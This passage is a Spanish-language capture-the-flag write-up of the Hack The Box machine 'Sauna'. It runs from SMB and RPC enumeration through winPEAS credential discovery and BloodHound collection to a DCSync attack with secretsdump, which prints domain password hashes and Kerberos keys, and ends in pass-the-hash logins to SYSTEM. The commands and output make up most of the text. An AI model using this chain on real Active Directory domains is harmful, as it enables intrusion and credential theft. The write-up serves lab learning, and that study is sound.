Bueno encontramos eso pero como tal no se si sea interesante pero bueno seguiremos enumerando

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -r SYSVOL/EGOTISTICAL-BANK.LOCAL/Policies
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	SYSVOL                                            	READ ONLY	
	.\SYSVOLEGOTISTICAL-BANK.LOCAL\Policies\*
	dr--r--r--                0 Sat Jan 25 14:48:44 2020	.
	dr--r--r--                0 Sat Jan 25 14:48:44 2020	..
	dr--r--r--                0 Sat Jan 25 14:48:44 2020	{2619FB25-7519-4AEA-9C1E-348725EF2858}
	dr--r--r--                0 Wed Jan 22 23:44:49 2020	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Wed Jan 22 23:44:49 2020	{6AC1786C-016F-11D2-945F-00C04fB984F9}
```

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -r SYSVOL/EGOTISTICAL-BANK.LOCAL/Policies/{2619FB25-7519-4AEA-9C1E-348725EF2858}/User
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	SYSVOL                                            	READ ONLY	
	.\SYSVOLEGOTISTICAL-BANK.LOCAL\Policies\{2619FB25-7519-4AEA-9C1E-348725EF2858}\User\*
	dr--r--r--                0 Sat Jan 25 14:48:44 2020	.
	dr--r--r--                0 Sat Jan 25 14:48:44 2020	..
```

Esto se veía interesante pero nada

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -r SYSVOL/EGOTISTICAL-BANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
[!] Something weird happened: SMB SessionError: STATUS_NOT_A_DIRECTORY(A requested opened file is not a directory.) on line 881
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	SYSVOL                                            	READ ONLY	
```

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -r SYSVOL/EGOTISTICAL-BANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GTP.INI
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
[!] Something weird happened: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.) on line 881
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	SYSVOL                                            	READ ONLY	

```

Bueno si nos conectamos con **rpcclient** y enumeramos los usuarios vemos que nos reporta esto 

```bash
❯ rpcclient 10.10.10.175 -U 'fsmith%Thestrokes23' -c enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[HSmith] rid:[0x44f]
user:[FSmith] rid:[0x451]
user:[svc_loanmgr] rid:[0x454]
```

Aquí vemos los grupos 

```bash
❯ rpcclient 10.10.10.175 -U 'fsmith%Thestrokes23'
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> 
```

No vemos otro que este en **Domain Admins** 

```bash
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	vie, 09 jun 2023 17:54:43 CST
	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
	Kickoff Time             :	mié, 31 dic 1969 18:00:00 CST
	Password last set Time   :	lun, 26 jul 2021 11:16:16 CDT
	Password can change Time :	mar, 27 jul 2021 11:16:16 CDT
	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000005a
	padding1[0..7]...
	logon_hrs[0..21]...

```

Nada interesante tampoco

```bash
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xfaf RID: 0x451 acb: 0x00010210 Account: FSmith	Name: Fergus Smith	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfad RID: 0x44f acb: 0x00000210 Account: HSmith	Name: Hugo Smith	Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: svc_loanmgr	Name: L Manager	Desc: (null)
rpcclient $> 
```

Vemos que hay otro usuario que reutiliza la contraseña 

```bash
❯ crackmapexec smb 10.10.10.175 -u users -p 'Thestrokes23' --continue-on-success
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\hsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\scoins:Thestrokes23 STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\hbear:Thestrokes23 STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\skerb:Thestrokes23 STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\btaylor:Thestrokes23 STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\sdriver:Thestrokes23 STATUS_LOGON_FAILURE 
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\scoins:Thestrokes23 STATUS_LOGON_FAILURE 
```

Pero el usuario no puede conectarse usando `evil-winrm`

```bash
❯ crackmapexec winrm 10.10.10.175 -u 'hsmith' -p 'Thestrokes23'
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [-] EGOTISTICAL-BANK.LOCAL\hsmith:Thestrokes23
```

## Shell fsmith 

Si verificamos con **crackmapexec** vemos que básicamente podemos conectarnos con `evil-winrm`

```bash
❯ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

Ahora nos conectamos

```bash
❯ evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

Estamos en la maquina victima

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::5c
   IPv6 Address. . . . . . . . . . . : dead:beef::dce2:4a20:8c87:aac7
   Link-local IPv6 Address . . . . . : fe80::dce2:4a20:8c87:aac7%7
   IPv4 Address. . . . . . . . . . . : 10.10.10.175
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a809%7
                                       10.10.10.2
*Evil-WinRM* PS C:\Users\FSmith\Documents> 

```

## User flag 

```bash
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
4458764bef43511f00518e1a8900b5c4
*Evil-WinRM* PS C:\Users\FSmith\Desktop> 
```

## Shell svc_loanmgr

Nada interesante

```bash
*Evil-WinRM* PS C:\Users\FSmith\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\FSmith\Desktop>
```

Vemos que hay otro usuario `svc_loanmgr` que no lo vimos en la web y no lo añadimos en la lista de usuarios que hicimos 

```bash
*Evil-WinRM* PS C:\Users\FSmith\Desktop> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\FSmith\Desktop> 
```

Si miramos mas información del usuario vemos que pertenece al grupo **Remote Management Users**

```bash
*Evil-WinRM* PS C:\Users\FSmith\Desktop> net user svc_loanmgr
User name                    svc_loanmgr
Full Name                    L Manager
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/24/2020 4:48:31 PM
Password expires             Never
Password changeable          1/25/2020 4:48:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\FSmith\Desktop> 
```

Vamos a crear un directorio para subir el **Winpeas** para enumerar un poco el sistema <https://github.com/carlospolop/PEASS-ng/releases/tag/20230604-b0985b44>

```bash
*Evil-WinRM* PS C:\Users\FSmith\Desktop> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> mkdir Prives


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/9/2023   7:02 PM                Prives


*Evil-WinRM* PS C:\Windows\Temp> cd Prives
*Evil-WinRM* PS C:\Windows\Temp\Prives> 
```

```bash
*Evil-WinRM* PS C:\Windows\Temp\Prives> upload /home/miguel7/Hackthebox/Sauna/content/winPEASx64.exe
                                        
Info: Uploading /home/miguel7/Hackthebox/Sauna/content/winPEASx64.exe to C:\Windows\Temp\Prives\winPEASx64.exe
                                        
Data: 2704724 bytes of 2704724 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp\Prives> 
```

Ahora vamos a correrlo

```bash
*Evil-WinRM* PS C:\Windows\Temp\Prives> .\winPEASx64.exe
```

Después de correr el **winPEASx64.exe** vemos que nos encontró credenciales xd 

![](/assets/images/htb-writeup-sauna/web4.png)

`svc_loanmanager:Moneymakestheworldgoround!`

**Crackmapexec** nos dice que no son correctas

```bash
❯ crackmapexec smb 10.10.10.175 -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!'
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\svc_loanmanager:Moneymakestheworldgoround! STATUS_LOGON_FAILURE 
```

Pero bueno lo mas probable es que no sean correctas por que como tal este usuario no existe en el dominio pero hay otro usuario que se llama `svc_loanmgr` así que si probamos con ese usuario si son correctas

```bash
❯ crackmapexec smb 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! 
```

Y también nos podemos conectar con `evil-winrm`

```bash
❯ crackmapexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
SMB         10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)

```

Ahora nos conectamos

```bash
❯ evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```

## Escalada de Privilegios 

No vemos nada interesante

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
```

Después de enumerar el sistema no encontré nada pero bueno vamos a usar una herramienta que es la primera vez que la uso en esta maquina que es **Bloodhoun** que te ayuda a decirte como puedes escalar privilegios lo que tenemos que hacer es subir el **SharpHoung.ps1** <https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1>

```bash
❯ wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
```

Antes de usar todo esto tenemos que tener esta opción en **11** si no da error al correr **neo4j** pues pon la versión que te digan

```bash
❯ update-alternatives --config java
Existen 2 opciones para la alternativa java (que provee /usr/bin/java).

  Selección   Ruta                                         Prioridad  Estado
------------------------------------------------------------
  0            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      modo automático
* 1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      modo manual
  2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      modo manual

Pulse <Intro> para mantener el valor por omisión [*] o pulse un número de selección: ^C
```

Ahora iniciamos el **neo4j** 

```bash
❯ neo4j start
Directories in use:
home:         /var/lib/neo4j
config:       /etc/neo4j
logs:         /var/log/neo4j
plugins:      /var/lib/neo4j/plugins
import:       /var/lib/neo4j/import
data:         /var/lib/neo4j/data
certificates: /var/lib/neo4j/certificates
licenses:     /var/lib/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:140609). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

Ahora nos conectamos

![](/assets/images/htb-writeup-sauna/web5.png)

Ahora vamos a ejecutar **Bloodhound**

```bash
❯ bloodhound &> /dev/null & disown
[1] 143656
```

Va abrir algo así

![](/assets/images/htb-writeup-sauna/web6.png)

Ahora si esta todo listo

![](/assets/images/htb-writeup-sauna/web7.png)

Ahora vamos a subir el **SharpHound**

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> upload SharpHound.ps1
                                        
Info: Uploading /home/miguel7/Hackthebox/Sauna/nmap/SharpHound.ps1 to C:\Users\svc_loanmgr\Documents\SharpHound.ps1
                                        
Data: 1744464 bytes of 1744464 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> dir


    Directory: C:\Users\svc_loanmgr\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/9/2023   7:40 PM        1308348 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```

Ahora vamos a importar 

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> Import-Module .\SharpHound.ps1
```

Ahora vamos a Invocar el modulo para que recolecte toda la información del dominio 

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> Invoke-BloodHound -CollectionMethod All
```

Ahora nos crea el comprimido 

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> dir


    Directory: C:\Users\svc_loanmgr\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/9/2023   8:10 PM           9117 20230609201055_BloodHound.zip
-a----         6/9/2023   7:57 PM         973325 SharpHound.ps1
-a----         6/9/2023   8:10 PM          11122 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin


*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```

```bash
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> download 20230609201055_BloodHound.zip bloodhound.zip
                                        
Info: Downloading C:\Users\svc_loanmgr\Documents\20230609201055_BloodHound.zip to bloodhound.zip
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```

Hay tenemos el archivo

```bash
❯ ls
 allPorts   bloodhound.zip   SharpHound.ps1   targeted
```

Y bueno ahora subimos el **.zip** 

Y ya encontramos algo interesante

![](/assets/images/htb-writeup-sauna/web8.png)

![](/assets/images/htb-writeup-sauna/web9.png)

Podemos realizar un ataque **DCSync** para obtener el hash del usuario admin y poder así hacer **passthehash**

Para esto vamos a usar una herramienta de **impacket** que es `secretsdump`

```bash
❯ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:fbeccb6e8cdf75d891399c53b4581823:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:49e0a6db19b412783baf04821eacc834d229043c105930d1cd1c7c78f634b95e
SAUNA$:aes128-cts-hmac-sha1-96:c7561b9fa1417020d30a46705e6325e2
SAUNA$:des-cbc-md5:f2fb7a4cbc2313d5
[*] Cleaning up... 
```

## Shell Administrator && root.txt 

Tenemos el **Hash**

`823452073d75b9d1cf70ebdf86c7f98e`

Ahora nos vamos a conectar como el usuario **administrator**

```bash
❯ evil-winrm -i 10.10.10.175 -u 'Administrator' -H 823452073d75b9d1cf70ebdf86c7f98e
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
8b4d1ef544d5e7b4deccde0952c2c9d7
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

También podemos hacerlo con esta herramienta

```bash
❯ psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file OVRFLufA.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service LKUE on 10.10.10.175.....
[*] Starting service LKUE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```
